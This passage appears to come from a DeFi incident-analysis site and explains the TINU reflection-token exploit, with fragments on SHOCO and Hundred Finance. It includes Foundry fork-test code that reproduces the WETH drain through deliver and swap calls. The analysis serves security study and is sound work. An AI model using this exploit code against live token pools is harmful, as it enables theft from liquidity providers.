be too large, leading to an error in the final <code>_update</code>: <code>require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), 'UniswapV2: OVERFLOW');</code>. Hence, they cannot all be used for <code>deliver</code>. The final profit is approximately 4.3 Ether.</p> <p>The complex call chain in the original attack may have been obtained through testing, which is not discussed here.</p>"},{"location":"2023/230119_SHOCO/#misc","title":"Misc","text":"<p>Obviously, the actual profit of 4.3 Ether is slightly more than the original attack's approximately 4.16 Ether. Therefore, upon further examination of the SHOCO token, it was found that someone related to the Nomad Bridge attack, launched another attack against it a month later. </p> <p>Furthermore, it can be observed that the attackContract used was deployed by another address 0x961c, and since its contract had no protection measures, it was directly used by 0x1dbd to complete frontrun.</p>"},{"location":"2023/230126_TINU/","title":"230126-TINU","text":""},{"location":"2023/230126_TINU/#attacktx","title":"AttackTx","text":"<p>Analyzing the attack transaction using Phalcon.</p>"},{"location":"2023/230126_TINU/#fund-flow","title":"Fund Flow","text":"<p>The fund flow is straightforward. Initially, about 139 WETH is flash loaned from Balancer and returned after the attack ends. </p> <p>104.85 WETH is used to swap for TINU tokens on the Uniswap pool, while withdrawing around 127 WETH additionally. Finally, WETH is converted to ETH to bribe flashbots builder, resulting in a profit of approximately 22.11 ETH.</p> <p>From the fund flow, alone, it can only be seen that there is a vulnerability in the TINU token.</p>"},{"location":"2023/230126_TINU/#balance-changes","title":"Balance Changes","text":""},{"location":"2023/230126_TINU/#state-changes","title":"State Changes","text":"<p>Apart from the ordinary Pair-related state variable changes, it's noteworthy that there were several state changes in the TINU token itself.</p>"},{"location":"2023/230126_TINU/#invocation-flow","title":"Invocation Flow","text":"<p>Next, let's analyze the internal invocation details of the transaction.</p> <p></p> <p>Firstly, the attack contract borrows WETH from Balancer.</p> <p></p> <p>Then, in the callback, it first buys TINU tokens with 104.85 WETH, and then uses the obtained TINU amount as a parameter to call the <code>deliver</code> function of the TINU contract. It then calls the pair's <code>skim</code> function. The balance of the attackContract is significantly higher than before, indicating that the <code>deliver</code> function call likely increased the amount of TINU tokens in the pair.</p> <p>Next, it calls the <code>deliver</code> function again with the entire balance as a parameter. Without transferring TINU tokens, it directly calls the pair's <code>swap</code> function, withdrawing around 127 WETH. This is about 22 more WETH than used for the initial purchase, resulting in a profit. The flash loan is also repaid.</p> <p>Clearly, this attack exploits the <code>deliver</code> function of the TINU token. Further analysis is needed in conjunction with the code to understand it better.</p>"},{"location":"2023/230126_TINU/#vulnerability","title":"Vulnerability","text":"<p>In fact, TINU is a type of reflection token. Before delving into the analysis of TINU's vulnerabilities and attack principles, let's first understand the classic reflection token.</p>"},{"location":"2023/230126_TINU/#reflection-token","title":"Reflection Token","text":"<p>The classic reflection token RFI is deployed at 0xa1afff.</p> <pre><code>uint256 private constant MAX = ~uint256(0);\nuint256 private constant _tTotal = 10 * 10**6 * 10**9;\nuint256 private _rTotal = (MAX - (MAX % _tTotal));\n\nfunction totalSupply() public view override returns (uint256) {\n    return _tTotal;\n}\n</code></pre> <p>Different from traditional ERC20 tokens, the reflection token defines the original <code>totalSupply</code> as <code>tTotal</code> and introduces <code>rTotal</code> additionally. Initially, <code>rTotal</code> is a multiple of <code>tTotal</code> that is less than or equal to <code>MAX</code> and closest to <code>MAX</code>.</p> <pre><code>constructor () public {\n    _rOwned[_msgSender()] = _rTotal;\n    emit Transfer(address(0), _msgSender(), _tTotal);\n}\n\nfunction balanceOf(address account) public view override returns (uint256) {\n    if (_isExcluded[account]) return _tOwned[account];\n    return tokenFromReflection(_rOwned[account]);\n}\n</code></pre> <p>Moreover, the address balance is not simply mapped as in the case of <code>balance</code>. Typically, it will be further calculated based on the value of <code>rOwned</code> using <code>tokenFromReflection</code>.</p> <pre><code>function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n    require(rAmount &lt;= _rTotal, \"Amount must be less than total reflections\");\n    uint256 currentRate =  _getRate();\n    return rAmount.div(currentRate);\n}\n\nfunction _getRate() private view returns(uint256) {\n    (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n    return rSupply.div(tSupply);\n}\n\nfunction _getCurrentSupply() private view returns(uint256, uint256) {\n    uint256 rSupply = _rTotal;\n    uint256 tSupply = _tTotal;\n    ...\n    ...\n    return (rSupply, tSupply);\n}\n</code></pre> <p>The <code>tokenFromReflection</code> function calculates a rate based on <code>rSupply</code> and <code>tSupply</code>, which allows the conversion of <code>rOwned</code> for an account address to the displayed balance quantity based on this rate.</p> <pre><code>function _transfer(address sender, address recipient, uint256 amount) private {\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\n    require(amount &gt; 0, \"Transfer amount must be greater than zero\");\n    if (_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) {\n        _transferFromExcluded(sender, recipient, amount);\n    } else if (!_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) {\n        _transferToExcluded(sender, recipient, amount);\n    } else if (!_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) {\n        _transferStandard(sender, recipient, amount);\n    } else if (_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) {\n        _transferBothExcluded(sender, recipient, amount);\n    } else {\n        _transferStandard(sender, recipient, amount);\n    }\n}\n\nfunction _transferStandard(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);\n}\n\nfunction _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {\n    (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);\n    uint256 currentRate =  _getRate();\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);\n    return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);\n}\n\nfunction _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {\n    uint256 tFee = tAmount.div(100);\n    uint256 tTransferAmount = tAmount.sub(tFee);\n    return (tTransferAmount, tFee);\n}\n\nfunction _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\n    uint256 rAmount = tAmount.mul(currentRate);\n    uint256 rFee = tFee.mul(currentRate);\n    uint256 rTransferAmount = rAmount.sub(rFee);\n    return (rAmount, rTransferAmount, rFee);\n}\n\nfunction _reflectFee(uint256 rFee, uint256 tFee) private {\n    _rTotal = _rTotal.sub(rFee);\n    _tFeeTotal = _tFeeTotal.add(tFee);\n}\n</code></pre> <p>During transfers, the values changed are those of <code>rOwned</code> by default. In a standard transfer scenario (i.e., not involving excluded addresses), <code>rAmount</code>, <code>rTransferAmount</code>, and <code>rFee</code> are first calculated based on the transfer amount <code>tAmount</code> and the current rate. Here, <code>rTransferAmount</code> represents 99% of the transfer amount, while <code>rFee</code> represents the remaining 1%. Subsequently, <code>_reflectFee</code> is called.</p> <p>The reflection here is the core of the reflection token. According to the <code>_reflectFee</code> function, 1% of the transfer amount is reflected. In other words, <code>rTotal</code> is reduced by <code>rFee</code> with each transfer, functioning similarly to <code>burn</code> in ERC20. As <code>rTotal</code> decreases, <code>rSupply</code> decreases accordingly, causing the rate to decrease. With other users' <code>rOwned</code> remaining unchanged, their corresponding balance via <code>tokenFromReflection(rOwned)</code> increases, enabling them to receive more tokens.</p> <p>That is, <code>rTotal</code> will decrease in each transfer (therefore this reflection token is also considered a deflationary token), causing the rate to continuously decrease and the corresponding balance of other holders to increase. As stated on their official website: \"RFI works by applying a 1% fee to each transaction and instantly splitting that fee among all holders of the token. Holders do not need to stake or wait for fees to be delivered. Fees are awarded by the smart contract and are immediately reflected in the holders balance.\"</p> <pre><code>function reflect(uint256 tAmount) public {\n    address sender = _msgSender();\n    require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n    (uint256 rAmount,,,,) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rTotal = _rTotal.sub(rAmount);\n    _tFeeTotal = _tFeeTotal.add(tAmount);\n}\n</code></pre> <p>Apart from using a 1% fee for reflection during transfers, users can also call the <code>reflect</code> function to voluntarily \"burn\" their tokens.</p> <pre><code>function excludeAccount(address account) external onlyOwner() {\n    require(!_isExcluded[account], \"Account is already excluded\");\n    if(_rOwned[account] &gt; 0) {\n        _tOwned[account] = tokenFromReflection(_rOwned[account]);\n    }\n    _isExcluded[account] = true;\n    _excluded.push(account);\n}\n\nfunction includeAccount(address account) external onlyOwner() {\n    require(_isExcluded[account], \"Account is already excluded\");\n    for (uint256 i = 0; i &lt; _excluded.length; i++) {\n        if (_excluded[i] == account) {\n                _excluded[i] = _excluded[_excluded.length - 1];\n                _tOwned[account] = 0;\n                _isExcluded[account] = false;\n                _excluded.pop();\n                break;\n        }\n    }\n}\n</code></pre> <p>For certain addresses, the owner can choose to exclude them from the entire reflection mechanism by calling the <code>excludeAccount</code> function. The balance of excluded addresses will no longer be calculated using <code>tokenFromReflection(rOwned)</code> but will directly use the value of <code>tOwned</code>, ensuring that their balance remains unchanged after reflection.</p> <pre><code>function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);\n}\n\nfunction _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n    _tOwned[sender] = _tOwned[sender].sub(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);\n}\n\nfunction _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n    _tOwned[sender] = _tOwned[sender].sub(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);    \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);\n}\n</code></pre> <p>Similarly, during transfers, for excluded accounts, both <code>rOwned</code> and <code>tOwned</code> need to be changed accordingly.</p> <pre><code>function _getCurrentSupply() private view returns(uint256, uint256) {\n    uint256 rSupply = _rTotal;\n    uint256 tSupply = _tTotal;\n    for (uint256 i = 0; i &lt; _excluded.length; i++) {\n        if (_rOwned[_excluded[i]] &gt; rSupply || _tOwned[_excluded[i]] &gt; tSupply) return (_rTotal, _tTotal);\n        rSupply = rSupply.sub(_rOwned[_excluded[i]]);\n        tSupply = tSupply.sub(_tOwned[_excluded[i]]);\n    }\n    if (rSupply &lt; _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n    return (rSupply, tSupply);\n}\n</code></pre> <p>When calculating the rate, excluded addresses need to be subtracted to obtain <code>rSupply</code> and <code>tSupply</code>.</p> <p>To summarize briefly, the balance of reflection tokens is closely related to the internal storage <code>rOwned</code>, which can be understood as shares. Transfers also involve the transfer of shares. <code>balanceOf</code> will retrieve the account's <code>rOwned</code> (shares), and then obtain the rate based on <code>rSupply/tSupply</code>, that is, how many shares correspond to one token, thus obtaining the token quantity (balance) corresponding to the account through <code>rOwned/rate</code>.</p> <p>When a reflect(burn) occurs, the total shares decrease, while the shares <code>rOwned</code> of other users remain unchanged, so the corresponding balance quantity will increase.</p> <p>Here is an explanation of some variables.</p> <pre><code>tTotal: const -&gt; totalSupply\n\nrTotal: variable\ninit: rTotal = q*tTotal\ndecrease in `_reflectFee` and `reflect`\n\ntFeeTotal:\ninit: 0\nincrease in `_reflectFee` and `reflect`\n\nbalance: \nif excluded -&gt; tOwned\nelse -&gt; rOwend/rate\n\nrate:\nrate = rSupply/tSupply\nrSupply = rTotal - \u03a3rExcluded\ntSupply = tTotal - \u03a3tExcluded\n</code></pre> <p>Clearly, if there are no excluded addresses, after user A performs a <code>transfer</code> or <code>reflect</code>, the balances of the remaining holders will increase. For reflection token pairs, the balance in the pool will also increase, exceeding the <code>reserve</code>, allowing other users to directly profit from <code>skim</code> or <code>swap</code>.</p> <p></p> <p>To avoid this vulnerability, reflection tokens should at least exclude the pair address. The deployer of RFI excluded the pair approximately twenty minutes after adding liquidity.</p>"},{"location":"2023/230126_TINU/#tinu","title":"TINU","text":"<p>The RFI token mentioned earlier has not been attacked so far and is still operating well on-chain. Therefore, we can compare it with TINU token to check for potential vulnerabilities that might have led to its attack.</p> <p></p> <pre><code>function testExcludePair() external {\n    uint attackBlockNumber = 16489408;\n    vm.rollFork(attackBlockNumber);\n    console2.log(\"exclude pair?\", tinu.isExcluded(address(tinu_weth)));\n    // false\n}\n</code></pre> <p>Firstly, it is observed that although the TINU contract has an excluded address, the lockToken contract is not the pair. Failing to exclude the pair will lead to the vulnerability mentioned earlier, where the balance of the pair will increase after <code>transfer</code> or <code>reflect</code>, allowing others to profit through <code>skim</code> or <code>swap</code>.</p> <p>In TINU, the <code>reflect</code> function has been renamed, which appears as the <code>deliver</code> function in the previous invocation flow. Therefore, it can be inferred that the attack profit strategy involves the attacker purchasing a certain amount of TINU tokens from the pool, then calling the <code>deliver</code> function to \"burn\" them, causing the rate to decrease sharply, resulting in a significant increase in the TINU balance of the pair, far exceeding the <code>reserve</code>, thus allowing for the direct <code>swap</code> of a large amount of WETH.</p> <p>The core question here is how to ensure that the WETH obtained in the end is greater than the WETH invested in purchasing TINU, i.e., what are the profit conditions. The analysis for RFI is provided below.</p> <p>In RFI, the following equation exists:</p> \\[ \\begin{align}  rate = \\frac{rSupply}{tSupply} \\tag{1} \\\\ rSupply = rTotal - \u03a3rExcluded \\tag{2} \\\\ tSupply = tTotal - \u03a3tExcluded \\tag{3} \\end{align} \\] <p>Assuming the attacker already holds \\(rReflect\\) amount of TINU tokens for reflection, before the attack: $$ \\begin{align}  pairBalance0 = \\frac{rPair0}{rate} = \\frac{rPair0 \\times tSupply}{rSupply} \\tag{4} \\end{align} $$</p> <p>After actively reflecting: $$ \\begin{align} pairBalance1 = \\frac{rPair0}{rate'} = \\frac{rPair0 \\times tSupply}{rSupply - rReflect} \\tag{5} \\end{align} $$</p> <p>The attacker can profit only if the amount of TINU tokens skimmed exceeds the amount \"burned\" during reflection, meaning it must satisfy:</p> \\[ \\begin{align} skimAmount &gt; reflectAmount = \\frac{rReflect}{rate} = \\frac{rReflect \\times tSupply}{rSupply} \\tag{6} \\\\   skimAmount = pairBalance1 - pairBalance0\\tag{7} \\end{align} \\] <p>Further, from \\((2), (4), (5), (6), (7)\\), we can deduce:</p> \\[ \\begin{align} rReflect &gt; rSupply - rPair0 \\tag{8} \\\\ rRefelct &gt; rTotal - \u03a3rExcluded - rPair0 \\tag{9} \\end{align} \\] <p>\\((8), (9)\\) represent the profit conditions.</p> <p>However, under normal circumstances, it is impossible to meet these conditions. Normally, <code>rTotal = \u03a3rOwned(holder)</code>, meaning: $$ \\begin{align} rTotal = \u03a3rExcluded + rPair0 + rOthers \\tag{10} \\end{align} $$</p> <p>\\((10)\\) is clearly contradictory to \\((9)\\), indicating that the attacker cannot obtain the required amount of tokens.</p> <p>For attackers without tokens, they first need to borrow WETH through flash loans to purchase TINU tokens. In this scenario: $$ \\begin{align} rRefelct + rPair0 = rPair \\tag{11} \\end{align} $$</p> <p>Where <code>rPair</code> is the initial state before the attacker purchases TINU, and <code>rPair0</code> is the state after the purchase and before reflection.</p> <p>From \\((9), (11)\\), it follows that the attack can only profit if: $$ \\begin{align} rPair &gt; rTotal - \u03a3rExcluded \\tag{12}  \\end{align} $$</p> <p>It is evidently impossible to satisfy this condition as well. Therefore, there must be other vulnerabilities in TINU tokens compared to the original reflection tokens.</p> <pre><code>function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tteam) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n    _taketeam(tteam); \n    _reflectFee(rFee, tFee);\n    emit Transfer(sender, recipient, tTransferAmount);\n}\n\nfunction _taketeam(uint256 tteam) private {\n    uint256 currentRate =  _getRate();\n    uint256 rteam = tteam.mul(currentRate);\n    _rOwned[address(this)] = _rOwned[address(this)].add(rteam);\n    // Come out of thin air\n    if(_isExcluded[address(this)])\n    _tOwned[address(this)] = _tOwned[address(this)].add(tteam);\n}\n\nfunction _reflectFee(uint256 rFee, uint256 tFee) private {\n    _rTotal = _rTotal.sub(rFee);\n    _tFeeTotal = _tFeeTotal.add(tFee);\n}\n</code></pre> <p>After comparison, we can see that during the transfer process in TINU, besides the fees burned in <code>reflectFee</code>, there is also a teamFee charged, which means transferring a certain amount of tokens to the TINU contract itself.</p> <pre><code>function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\n    (uint256 tTransferAmount, uint256 tFee, uint256 tteam) = _getTValues(tAmount, _taxFee, _teamFee);\n    uint256 currentRate =  _getRate();\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);\n    return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tteam);\n}\n\nfunction _getTValues(uint256 tAmount, uint256 taxFee, uint256 teamFee) private pure returns (uint256, uint256, uint256) {\n    uint256 tFee = tAmount.mul(taxFee).div(100);\n    uint256 tteam = tAmount.mul(teamFee).div(100);\n    uint256 tTransferAmount = tAmount.sub(tFee).sub(tteam);\n    return (tTransferAmount, tFee, tteam);\n}\n\nfunction _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\n    uint256 rAmount = tAmount.mul(currentRate);\n    uint256 rFee = tFee.mul(currentRate); \n    uint256 rTransferAmount = rAmount.sub(rFee);\n    // Missing sub teamFee\n    return (rAmount, rTransferAmount, rFee);\n}\n</code></pre> <p>In calculating the relevant values, it can be noted that in the <code>_getRValues</code> function, <code>rTransferAmount</code> is only reduced by <code>rFee</code> without a corresponding reduction in <code>rteam</code>. This causes the <code>rteam</code> in <code>_taketeam</code> to come out of thin air.</p> <p>For example, if the <code>rAmount</code> of a transfer is 100, with 10% fees and teamFee each, then <code>rFee</code> and <code>rteam</code> are both 10. After the transfer:</p> <pre><code>rOwned[sender] -= 100\nrOwned[team] += 10\nrTotal -= 10\nrOwned[receiver] += 90\n</code></pre> <p>This results in an issuance of <code>rOwned</code> out of thin air, causing <code>\u03a3rOwned(holder) &gt; rTotal</code>, whereas it should be <code>rOwned[receiver] += 80</code> under normal circumstances.</p> <pre><code>function _transfer(address sender, address recipient, uint256 amount) private {\n    ...\n    ...\n    // is the token balance of this contract address over the min number of\n    // tokens that we need to initiate a swap?\n    // also, don't get caught in a circular team event.\n    // also, don't swap if sender is uniswap pair.\n    uint256 contractTokenBalance = balanceOf(address(this));\n\n    if(contractTokenBalance &gt;= _maxTxAmount) {\n        contractTokenBalance = _maxTxAmount;\n    }\n\n    bool overMinTokenBalance = contractTokenBalance &gt;= _numOfTokensToExchangeForteam;\n    if (!inSwap &amp;&amp; swapEnabled &amp;&amp; overMinTokenBalance &amp;&amp; sender != uniswapV2Pair) {\n        // We need to swap the current tokens to ETH and send to the team wallet\n        swapTokensForEth(contractTokenBalance);\n        uint256 contractETHBalance = address(this).balance;\n        if(contractETHBalance &gt; 0) {\n                sendETHToteam(address(this).balance);\n        }\n    }\n    ...\n    ...\n}\n\nfunction swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\n    // generate the uniswap pair path of token -&gt; weth\n    [] memory path = new address[](2);\n    path[0] = address(this);\n    path[1] = uniswapV2Router.WETH();\n\n    _approve(address(this), address(uniswapV2Router), tokenAmount);\n\n    // make the swap\n    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0, // accept any amount of ETH\n        path,\n        address(this),\n        block.timestamp\n    );\n}\n\nfunction sendETHToteam(uint256 amount) private {\n    _teamWalletAddress.transfer(amount.div(2));\n    _marketingWalletAddress.transfer(amount.div(2));\n}\n</code></pre> <p>In addition, in its <code>transfer</code> function, it checks the TINU balance of the current contract, i.e., whether the total received teamFee exceeds a certain threshold. If so, it exchanges TINU tokens for WETH and transfers the profit out. This gradual influx of the <code>rOwned</code> allocated to the team into the pair makes it possible for condition \\((12)\\) for profit to be met.</p> <pre><code>function testCondition() external {\n    uint attackBlockNumber = 16489408;\n    vm.rollFork(attackBlockNumber);\n\n    uint256 rTotal = uint256(vm.load(address(tinu), bytes32(uint256(13))));\n    uint256 rExcluded = getMappingValue(address(tinu), 3, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));\n    uint256 tExcluded = getMappingValue(address(tinu), 4, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));\n    uint256 rPair = getMappingValue(address(tinu), 3, address(tinu_weth));\n\n    emit log_named_uint(\"TINU rTotal\", rTotal);       // 108768187544805713501204846339732808402752408502014790599736522386140496654995\n    emit log_named_uint(\"TINU rExcluded\", rExcluded);  // 3192758909975747822405896956488198123659233150861213276289711491709459543580\n    emit log_named_uint(\"TINU tExcluded\", tExcluded);  // 0\n    emit log_named_uint(\"Pair rOwned\", rPair); // 108505905800335567462313514886909726810259466467478275604883839519551731249929\n    console2.log(\"rPair &gt; rSupply?\", rPair &gt; rTotal-rExcluded); // true\n}\n</code></pre> <p>Using the above code for testing, it can be confirmed that TINU satisfies \\((12)\\).</p> <p>It can also be noted that the only excluded address has a <code>tOwned</code> of 0, while <code>rOwned</code> is not 0.</p> <p></p> <p>Analysis reveals that this address was first excluded by the account 0x777777 and then three TINU tokens were locked in it one after another.</p> <p></p> <p>Less than a month later, all TINU tokens locked in it were withdrawn.</p> <p>So this is because after the account was excluded, due to the reflection mechanism in the transfer, the rate kept decreasing. Therefore, for the fixed TINU balance (<code>tOwned</code>) in the excluded account, the final withdrawal corresponds to a smaller <code>rOwned</code>, resulting in a <code>rOwned</code> remainder.</p> <p>In summary, the vulnerability of TINU lies first in not excluding the pair as RFI does. If the pair is excluded, <code>reflect</code> will not affect the pair's balance, and the subsequent attack logic cannot be completed. Additionally, there is a vulnerability in the transfer logic, which increases <code>rOwned</code> out of thin air, further facilitating the formation of profitable conditions for the attack.</p>"},{"location":"2023/230126_TINU/#exploit","title":"Exploit","text":""},{"location":"2023/230126_TINU/#reproduce","title":"Reproduce","text":"<p>The previous analysis covered the vulnerabilities in TINU. However, for attackers, there is another question: how many TINU tokens should be used for the reflection to maximize profits, or even to drain all WETH from the pair.</p> <p>To maximize the value of <code>skimAmount</code> in \\((7)\\), we can simplify it as follows:</p> \\[ \\begin{align} skimAmount = \\frac{rReflect \\times (rPair - rReflect)}{rSupply\\times(rSupply-rReflect)}\\tag{13} \\end{align} \\] <p>Since \\(rPair &gt; rSupply\\), when \\(rReflect\\) approaches \\(rSupply\\), more TINU tokens can be skimmed, and correspondingly, more WETH can be swapped.</p> <p>Therefore, the <code>swap</code> should purchase TINU tokens that are close to the quantity of \\(rSupply\\).</p> <p>(If you buy more tokens than \\(rSupply\\), according to \\((13)\\), there will be no profit. Additionally, the <code>transfer</code> function will check if the amount is less than <code>tTotal</code>, so it will revert.)</p> <p>The final exploit is as follows.</p> <pre><code>function testExploit() external {\n    uint attackBlockNumber = 16489408;\n    vm.rollFork(attackBlockNumber);\n\n    deal(address(weth), address(this), 2000 ether);\n\n    uint256 rTotal = uint256(vm.load(address(tinu), bytes32(uint256(13))));\n    uint256 rExcluded = getMappingValue(address(tinu), 3, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));\n    uint256 rAmountOut = rTotal-rExcluded;\n    uint256 tinuAmountOut = tinu.tokenFromReflection(rAmountOut) - 0.1*10**9;\n\n    (uint reserve0, uint reserve1, ) = tinu_weth.getReserves();\n    uint256 wethAmountIn = getAmountIn(tinuAmountOut, reserve1, reserve0);\n    emit log_named_decimal_uint(\"WETH amountIn\", wethAmountIn, weth.decimals());\n    weth.transfer(address(tinu_weth), wethAmountIn);\n\n    tinu_weth.swap(\n        tinuAmountOut,\n        0, \n        address(this),\n        \"\"\n    );\n\n    tinu.deliver(tinu.balanceOf(address(this)));\n\n    (reserve0, reserve1, ) = tinu_weth.getReserves();\n    uint256 wethAmountOut = getAmountOut(tinu.balanceOf(address(tinu_weth))-reserve0, reserve0, reserve1);\n    tinu_weth.swap(0, wethAmountOut, address(this), \"\");\n    emit log_named_decimal_uint(\"Attack profit:\", wethAmountOut - wethAmountIn, weth.decimals());\n}\n</code></pre> <p>For simplicity, let's assume the attacker already owns a large amount of WETH and does not use a flash loan.</p> <p>In TINU, approximately 800 WETH can be exchanged for nearly \\(rSupply\\) TINU tokens. After delivering all the tokens obtained, one can directly <code>swap</code> them for WETH, resulting in a net profit of about 22.1445 WETH, which is approximately 0.004 WETH higher than the original attack. The original attack only used 104.85 WETH for the first purchase, then executed <code>skim-&gt;deliver-&gt;swap</code>. The attacker might have used a method and data obtained through testing or more complex mathematical calculations, which we will not delve into here.</p> <pre><code>function testSwap() external {\n    uint attackBlockNumber = 16489408;\n    vm.rollFork(attackBlockNumber);\n    uint256 rTotal = uint256(vm.load(address(tinu), bytes32(uint256(13))));\n    uint256 rExcluded = getMappingValue(address(tinu), 3, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));\n    uint256 tinuDeliver = tinu.tokenFromReflection(rTotal-rExcluded)-0.1*10**9;\n\n    // uint256 amountOut = 1 ether;\n    uint256 amountOut = 22144561460967547974;\n    tinu_weth.swap(tinuDeliver, amountOut, address(this), \"1\");\n    emit log_named_decimal_uint(\"WETH balance\", weth.balanceOf(address(this)), weth.decimals());\n}\n\nfunction uniswapV2Call(address /*sender*/, uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {\n    tinu.deliver(tinu.balanceOf(address(this)));\n    // (uint reserve0, uint reserve1, ) = tinu_weth.getReserves();\n    // uint256 profit = getAmountOut(tinu.balanceOf(address(tinu_weth))-reserve0, reserve0, reserve1);\n    // console2.log(profit);\n    // 22144561460967547974\n}\n</code></pre> <p>Furthermore, there is no need to purchase TINU tokens in advance. As shown in the code above, the attack can be completed directly in one <code>swap</code>, only needing to <code>deliver</code> the TINU tokens in the callback and calculate the final amount of WETH that can be exchanged in the <code>swap</code> parameter in advance. This calculation is complex, so it can be tested first in the callback to obtain the data before using it in the <code>swap</code>.</p>"},{"location":"2023/230126_TINU/#attack-flow","title":"Attack Flow","text":"<p>Analyze the entire attack process of the attacker address.</p> <p></p> <p></p> <p>On January 19th, the attacker first obtained initial funds through Railgun.</p> <p>Then, they deployed an unused contract and a contract that was called but failed.</p> <p></p> <p>By checking the failed transaction, it can be seen that there was a similar vulnerability in the SHOCO token, and an attack was launched against it. However, this attack was frontrun by a bot.</p> <p>A simple analysis of the first contract after decompilation reveals that it is also targeting the SHOCO token.</p> <p>The last contract deployed by the attacker is the attack contract targeting TINU. According to the earlier fund flow, Flashbots' service was used during this attack, thus avoiding frontrunning. At the same time, it self-destructs after the attack is completed.</p> <p>Finally, after some time, the attacker transferred the attack proceeds through FixedFloat and SimpleSwap.</p>"},{"location":"2023/230415_HundredFinance/","title":"230415-HundredFinance","text":""},{"location":"2023/230415_HundredFinance/#attacktx","title":"AttackTx","text":"<p>Analyzing the attack transaction using Phalcon.</p> <p></p> <p>The fund flow of this attack transaction is highly complex. From the Balance Changes, it's evident that the attacker ultimately obtained a significant amount of Ether, as well as DAI, USDT, and other tokens related to the Hundred Finance protocol. Additionally, the attacker borrowed WBTC from Aave to carry out the attack.</p>"},{"location":"2023/230415_HundredFinance/#invocation-flow","title":"Invocation Flow","text":"<p>Let's analyze the invocation flow.</p> <p></p> <p>The attackContract initially borrowed 500 WBTC from Aave.</p> <p></p> <p>Then, approximately 15 hWBTC were redeemed for about 0.3 WBTC.</p> <p></p> <p>Afterward, all WBTC was transferred to a specified address, and a contract was created at that address using the CREATE2 instruction.</p> <p></p> <p>In the constructor of the new contract, ETHDrain, first, <code>approve</code> was given to the hWBTC contract for WBTC. Then, 4e8 WBTC was passed into the <code>mint</code> function, resulting in 20,000,000,000 hWBTC. Subsequently, the <code>redeem</code> function was called, exchanging 19,999,999,998 hWBTC for 4 WBTC.</p> <p>There seems to be an issue here, as it appears that 2 hWBTC were obtained out of nowhere.</p> <p></p> <p></p> <p>However, upon closer inspection, it's revealed that the exchangeRate during <code>mint</code> was 20,000,000,000,000,000, whereas during <code>redeem</code>, it was 20,000,000,050,000,000. This means that the previous <code>mint</code> altered the rate, allowing the same hWBTC to redeem more WBTC. It's also noticeable that the quantity redeemable here is slightly larger than 400,000,000. However, the final result is truncated after <code>truncate</code>, indicating a precision loss issue.</p> <p></p> <p>Subsequently, ETHDrain transferred slightly over 500 WBTC to the hWBTC contract, then <code>enterMarkets(hWBTC)</code>, and borrowed approximately 1021 Ether.</p> <p></p> <p>Later, the <code>redeemUnderlying</code> function was called, exchanging 1 hWBTC for almost all of the WBTC previously transferred to the hWBTC contract. These WBTC were then returned 